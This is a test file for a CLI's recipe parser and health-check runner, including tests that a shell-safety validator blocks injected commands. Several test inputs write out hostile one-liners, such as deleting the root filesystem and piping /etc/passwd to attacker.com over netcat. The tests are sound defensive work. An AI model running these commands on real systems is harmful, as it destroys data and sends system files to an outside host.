import { describe, test, expect, beforeAll } from 'bun:test';
import { parseRecipe, isUnsafeHealthCheck, expandVars, executeHealthCheck } from '../src/commands/integrations.ts';

// --- parseRecipe tests ---

describe('parseRecipe', () => {
  test('parses valid recipe with full frontmatter', () => {
    const content = `---
id: test-recipe
name: Test Recipe
version: 1.0.0
description: A test recipe
category: sense
requires: []
secrets:
  - name: API_KEY
    description: Test key
    where: https://example.com
health_checks:
  - "echo ok"
setup_time: 5 min
---

# Setup Guide

Step 1: do the thing.

---

Step 2: do the other thing.
`;
    const recipe = parseRecipe(content, 'test.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.id).toBe('test-recipe');
    expect(recipe!.frontmatter.name).toBe('Test Recipe');
    expect(recipe!.frontmatter.version).toBe('1.0.0');
    expect(recipe!.frontmatter.category).toBe('sense');
    expect(recipe!.frontmatter.secrets).toHaveLength(1);
    expect(recipe!.frontmatter.secrets[0].name).toBe('API_KEY');
    expect(recipe!.frontmatter.secrets[0].where).toBe('https://example.com');
    expect(recipe!.frontmatter.health_checks).toHaveLength(1);
    // Body should contain the horizontal rule (---) without being split
    expect(recipe!.body).toContain('Step 1');
    expect(recipe!.body).toContain('Step 2');
    expect(recipe!.body).toContain('---');
  });

  test('body with --- horizontal rules is NOT split as timeline', () => {
    const content = `---
id: hr-test
name: HR Test
---

Section one content.

---

Section two content.

---

Section three content.
`;
    const recipe = parseRecipe(content, 'hr-test.md');
    expect(recipe).not.toBeNull();
    // All three sections should be in the body (gray-matter doesn't split on ---)
    expect(recipe!.body).toContain('Section one');
    expect(recipe!.body).toContain('Section two');
    expect(recipe!.body).toContain('Section three');
  });

  test('returns null for missing id', () => {
    const content = `---
name: No ID Recipe
---
Content here.
`;
    const recipe = parseRecipe(content, 'no-id.md');
    expect(recipe).toBeNull();
  });

  test('returns null for malformed YAML', () => {
    const content = `---
id: broken
  this is not: valid: yaml: [
---
Content.
`;
    const recipe = parseRecipe(content, 'broken.md');
    expect(recipe).toBeNull();
  });

  test('returns null for no frontmatter', () => {
    const content = `# Just a markdown file

No frontmatter here.
`;
    const recipe = parseRecipe(content, 'plain.md');
    expect(recipe).toBeNull();
  });

  test('defaults missing optional fields', () => {
    const content = `---
id: minimal
---
Minimal recipe.
`;
    const recipe = parseRecipe(content, 'minimal.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.name).toBe('minimal');
    expect(recipe!.frontmatter.version).toBe('0.0.0');
    expect(recipe!.frontmatter.category).toBe('sense');
    expect(recipe!.frontmatter.requires).toEqual([]);
    expect(recipe!.frontmatter.secrets).toEqual([]);
    expect(recipe!.frontmatter.health_checks).toEqual([]);
  });

  test('parses reflex category', () => {
    const content = `---
id: meeting-prep
category: reflex
---
Prep for meetings.
`;
    const recipe = parseRecipe(content, 'reflex.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.category).toBe('reflex');
  });

  test('parses multiple secrets', () => {
    const content = `---
id: multi-secret
secrets:
  - name: KEY_A
    description: First key
    where: https://a.com
  - name: KEY_B
    description: Second key
    where: https://b.com
  - name: KEY_C
    description: Third key
    where: https://c.com
---
Content.
`;
    const recipe = parseRecipe(content, 'multi.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.secrets).toHaveLength(3);
    expect(recipe!.frontmatter.secrets[2].name).toBe('KEY_C');
  });
});

// --- CLI structure tests ---

describe('CLI integration', () => {
  let cliSource: string;

  beforeAll(() => {
    const { readFileSync } = require('fs');
    cliSource = readFileSync(new URL('../src/cli.ts', import.meta.url), 'utf-8');
  });

  test('CLI_ONLY set contains integrations', () => {
    expect(cliSource).toContain("'integrations'");
  });

  test('handleCliOnly routes integrations before connectEngine', () => {
    // integrations case must appear before "All remaining CLI-only commands need a DB"
    const integrationsIdx = cliSource.indexOf("command === 'integrations'");
    const dbComment = cliSource.indexOf('All remaining CLI-only commands need a DB');
    expect(integrationsIdx).toBeGreaterThan(0);
    expect(dbComment).toBeGreaterThan(0);
    expect(integrationsIdx).toBeLessThan(dbComment);
  });

  test('help text mentions integrations', () => {
    expect(cliSource).toContain('integrations');
  });
});

// --- Recipe file validation ---

describe('twilio-voice-brain recipe', () => {
  test('recipe file parses correctly', () => {
    const { readFileSync } = require('fs');
    const content = readFileSync(
      new URL('../recipes/twilio-voice-brain.md', import.meta.url),
      'utf-8'
    );
    const recipe = parseRecipe(content, 'twilio-voice-brain.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.id).toBe('twilio-voice-brain');
    expect(recipe!.frontmatter.category).toBe('sense');
    expect(recipe!.frontmatter.secrets.length).toBeGreaterThan(0);
    expect(recipe!.frontmatter.health_checks.length).toBeGreaterThan(0);
    // Body should not be corrupted (contains --- horizontal rules)
    expect(recipe!.body.length).toBeGreaterThan(100);
  });

  test('recipe has required secrets with where URLs', () => {
    const { readFileSync } = require('fs');
    const content = readFileSync(
      new URL('../recipes/twilio-voice-brain.md', import.meta.url),
      'utf-8'
    );
    const recipe = parseRecipe(content, 'twilio-voice-brain.md');
    expect(recipe).not.toBeNull();
    for (const secret of recipe!.frontmatter.secrets) {
      expect(secret.name).toBeTruthy();
      expect(secret.where).toBeTruthy();
      expect(secret.where).toContain('https://');
    }
  });

  test('recipe has all required secrets', () => {
    const { readFileSync } = require('fs');
    const content = readFileSync(
      new URL('../recipes/twilio-voice-brain.md', import.meta.url),
      'utf-8'
    );
    const recipe = parseRecipe(content, 'twilio-voice-brain.md');
    expect(recipe).not.toBeNull();
    const secretNames = recipe!.frontmatter.secrets.map((s: any) => s.name);
    expect(secretNames).toContain('TWILIO_ACCOUNT_SID');
    expect(secretNames).toContain('TWILIO_AUTH_TOKEN');
    expect(secretNames).toContain('OPENAI_API_KEY');
  });

  test('recipe version is valid semver', () => {
    const { readFileSync } = require('fs');
    const content = readFileSync(
      new URL('../recipes/twilio-voice-brain.md', import.meta.url),
      'utf-8'
    );
    const recipe = parseRecipe(content, 'twilio-voice-brain.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.version).toMatch(/^\d+\.\d+\.\d+$/);
  });

  test('recipe requires resolve to existing recipe files', () => {
    const { readFileSync, existsSync } = require('fs');
    const { resolve } = require('path');
    const content = readFileSync(
      new URL('../recipes/twilio-voice-brain.md', import.meta.url),
      'utf-8'
    );
    const recipe = parseRecipe(content, 'twilio-voice-brain.md');
    expect(recipe).not.toBeNull();
    const recipesDir = new URL('../recipes/', import.meta.url).pathname;
    for (const dep of recipe!.frontmatter.requires) {
      const depPath = resolve(recipesDir, `${dep}.md`);
      expect(existsSync(depPath)).toBe(true);
    }
  });
});

// --- All recipes parse without error ---

describe('all recipes', () => {
  test('every recipe file in recipes/ parses correctly', () => {
    const { readFileSync, readdirSync } = require('fs');
    const { resolve } = require('path');
    const recipesDir = new URL('../recipes/', import.meta.url).pathname;
    const files = readdirSync(recipesDir).filter((f: string) => f.endsWith('.md'));
    expect(files.length).toBeGreaterThan(0);
    for (const file of files) {
      const content = readFileSync(resolve(recipesDir, file), 'utf-8');
      const recipe = parseRecipe(content, file);
      expect(recipe).not.toBeNull();
      expect(recipe!.frontmatter.id).toBeTruthy();
    }
  });

  test('no recipe contains personal references', () => {
    const { readFileSync, readdirSync } = require('fs');
    const { resolve } = require('path');
    const recipesDir = new URL('../recipes/', import.meta.url).pathname;
    const files = readdirSync(recipesDir).filter((f: string) => f.endsWith('.md'));
    const personalPatterns = /wintermute|mercury|16507969501|\+1650796/i;
    for (const file of files) {
      const content = readFileSync(resolve(recipesDir, file), 'utf-8');
      expect(content).not.toMatch(personalPatterns);
    }
  });

  test('typed health_checks parse correctly in all recipes', () => {
    const { readFileSync, readdirSync } = require('fs');
    const { resolve } = require('path');
    const recipesDir = new URL('../recipes/', import.meta.url).pathname;
    const files = readdirSync(recipesDir).filter((f: string) => f.endsWith('.md'));
    for (const file of files) {
      const content = readFileSync(resolve(recipesDir, file), 'utf-8');
      const recipe = parseRecipe(content, file);
      expect(recipe).not.toBeNull();
      for (const check of recipe!.frontmatter.health_checks) {
        if (typeof check === 'string') {
          // String health checks are deprecated but still valid
          expect(typeof check).toBe('string');
        } else {
          // Typed checks must have a valid type
          expect(['http', 'env_exists', 'command', 'any_of']).toContain((check as any).type);
        }
      }
    }
  });
});

// --- isUnsafeHealthCheck tests ---

describe('isUnsafeHealthCheck', () => {
  test('allows simple commands', () => {
    expect(isUnsafeHealthCheck('echo ok')).toBe(false);
    expect(isUnsafeHealthCheck('curl -s https://api.example.com/health')).toBe(false);
    expect(isUnsafeHealthCheck('which git')).toBe(false);
    expect(isUnsafeHealthCheck('python3 --version')).toBe(false);
  });

  test('blocks shell chaining operators', () => {
    expect(isUnsafeHealthCheck('echo ok; rm -rf /')).toBe(true);
    expect(isUnsafeHealthCheck('echo ok && curl attacker.com')).toBe(true);
    expect(isUnsafeHealthCheck('echo ok & bg-process')).toBe(true);
    expect(isUnsafeHealthCheck('cat /etc/passwd | nc attacker.com 4444')).toBe(true);
  });

  test('blocks command substitution', () => {
    expect(isUnsafeHealthCheck('echo $(whoami)')).toBe(true);
    expect(isUnsafeHealthCheck('echo `id`')).toBe(true);
  });

  test('blocks subshell and brace expansion', () => {
    expect(isUnsafeHealthCheck('(curl attacker.com)')).toBe(true);
    expect(isUnsafeHealthCheck('{echo,/etc/passwd}')).toBe(true);
  });

  test('blocks redirect and newline injection', () => {
    expect(isUnsafeHealthCheck('echo ok > /dev/null')).toBe(true);
    expect(isUnsafeHealthCheck('echo ok < /etc/passwd')).toBe(true);
    expect(isUnsafeHealthCheck('echo ok\ncurl attacker.com')).toBe(true);
  });
});

// --- expandVars tests ---

describe('expandVars', () => {
  test('expands known env vars', () => {
    process.env.TEST_VAR_A = 'hello';
    expect(expandVars('prefix-$TEST_VAR_A-suffix')).toBe('prefix-hello-suffix');
    delete process.env.TEST_VAR_A;
  });

  test('replaces unknown vars with empty string', () => {
    delete process.env.NONEXISTENT_VAR_XYZ;
    expect(expandVars('$NONEXISTENT_VAR_XYZ')).toBe('');
  });

  test('handles multiple vars', () => {
    process.env.TEST_A = 'one';
    process.env.TEST_B = 'two';
    expect(expandVars('$TEST_A and $TEST_B')).toBe('one and two');
    delete process.env.TEST_A;
    delete process.env.TEST_B;
  });

  test('leaves strings without vars unchanged', () => {
    expect(expandVars('https://example.com/path')).toBe('https://example.com/path');
  });
});

// --- executeHealthCheck tests ---

describe('executeHealthCheck', () => {
  test('env_exists returns ok when env var is set', async () => {
    process.env.TEST_HC_VAR = 'present';
    const result = await executeHealthCheck({ type: 'env_exists', name: 'TEST_HC_VAR', label: 'Test' }, 'test-id', true);
    expect(result.status).toBe('ok');
    expect(result.output).toContain('set');
    delete process.env.TEST_HC_VAR;
  });

  test('env_exists returns fail when env var is missing', async () => {
    delete process.env.TEST_HC_MISSING;
    const result = await executeHealthCheck({ type: 'env_exists', name: 'TEST_HC_MISSING' }, 'test-id', true);
    expect(result.status).toBe('fail');
    expect(result.output).toContain('NOT SET');
  });

  test('command returns ok for exit 0', async () => {
    const result = await executeHealthCheck({ type: 'command', argv: ['true'], label: 'true cmd' }, 'test-id', true);
    expect(result.status).toBe('ok');
  });

  test('command returns fail for exit 1', async () => {
    const result = await executeHealthCheck({ type: 'command', argv: ['false'], label: 'false cmd' }, 'test-id', true);
    expect(result.status).toBe('fail');
  });

  test('any_of returns ok if first check passes', async () => {
    process.env.TEST_ANYOF = 'yes';
    const result = await executeHealthCheck({
      type: 'any_of',
      label: 'fallback',
      checks: [
        { type: 'env_exists', name: 'TEST_ANYOF' },
        { type: 'env_exists', name: 'NONEXISTENT' },
      ],
    }, 'test-id', true);
    expect(result.status).toBe('ok');
    delete process.env.TEST_ANYOF;
  });

  test('any_of returns ok if second check passes', async () => {
    delete process.env.TEST_FIRST;
    process.env.TEST_SECOND = 'yes';
    const result = await executeHealthCheck({
      type: 'any_of',
      label: 'fallback',
      checks: [
        { type: 'env_exists', name: 'TEST_FIRST' },
        { type: 'env_exists', name: 'TEST_SECOND' },
      ],
    }, 'test-id', true);
    expect(result.status).toBe('ok');
    delete process.env.TEST_SECOND;
  });

  test('any_of returns fail if all checks fail', async () => {
    delete process.env.TEST_NONE_A;
    delete process.env.TEST_NONE_B;
    const result = await executeHealthCheck({
      type: 'any_of',
      label: 'fallback',
      checks: [
        { type: 'env_exists', name: 'TEST_NONE_A' },
        { type: 'env_exists', name: 'TEST_NONE_B' },
      ],
    }, 'test-id', true);
    expect(result.status).toBe('fail');
  });

  test('string health_check blocks unsafe metacharacters for non-embedded', async () => {
    const result = await executeHealthCheck('echo ok; rm -rf /', 'test-id', false);
    expect(result.status).toBe('blocked');
    expect(result.output).toContain('unsafe shell characters');
  });

  test('string health_check runs for embedded recipes', async () => {
    const result = await executeHealthCheck('echo hello-world', 'test-id', true);
    expect(result.status).toBe('ok');
    expect(result.output).toContain('hello-world');
  });
});
